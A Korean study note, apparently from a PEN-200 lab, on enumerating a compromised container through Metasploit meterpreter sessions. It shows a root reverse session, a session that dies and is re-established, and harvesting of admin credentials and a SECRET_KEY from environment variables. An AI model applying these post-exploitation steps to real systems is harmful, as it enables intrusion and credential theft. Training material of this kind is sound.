# 26.10.1 프로덕션 컨테이너 열거

> **Enumerating the Production Container** · PEN-200 §26.10.1

`sessions` 로 목록을 보고 `sessions -i 2` 로 잡힌 세션에 들어감. 목록에서 이미 두 가지가 드러남 — **root 로 돌고 있고**, 호스트명이 `6699d104d6c5` 같은 무작위 영숫자임(랩마다 값이 다름). 이 조합이 컨테이너를 의심할 첫 신호임.

```
msf6 exploit(multi/handler) > sessions
Active sessions
===============
  Id  Name  Type                      Information          Connection
  --  ----  ----                      -----------          ----------
  2         meterpreter python/linux  root @ 6699d104d6c5  10.0.1.54:4488 ->
198.18.53.73:37604 (172.18.0.4)
msf6 exploit(multi/handler) > sessions -i 2
[*] Starting interaction with 2...
```

*세션 목록 — `Information` 열에 `root @ 6699d104d6c5` 가 보임*

**서로 다른 두 사설 대역에 물려 있음.** 인터페이스가 둘이라는 것은 반대편에 볼 것이 있다는 뜻이라 기록해둠.

*환경변수 — 관리자 자격 증명과 `SECRET_KEY` 가 그대로 들어 있음. 쓸 곳은 아직 모르나 적어둠*

⚠️ **세션이 열거 도중 죽는 것은 정상임** — 서비스가 주기적으로 재시작되기 때문임. 재시작되면 새 meterpreter 세션이 곧바로 열리므로 `sessions -i` 에 **새 ID** 를 넣어 갈아타면 됨. 셸이 죽었다고 공격이 실패한 것으로 오판하지 말 것.

```
[*] 172.18.0.4 - Meterpreter session 2 closed.  Reason: Died
[*] Sending stage (24772 bytes) to 198.18.53.73
[*] Meterpreter session 3 opened (10.0.1.54:4488 -> 198.18.53.73:60146)
msf6 exploit(multi/handler) > sessions -i 3
[*] Starting interaction with 3...
meterpreter >
```

*세션 2 가 죽자마자 세션 3 이 열림 — 새 ID 로 갈아타면 그대로 이어감*
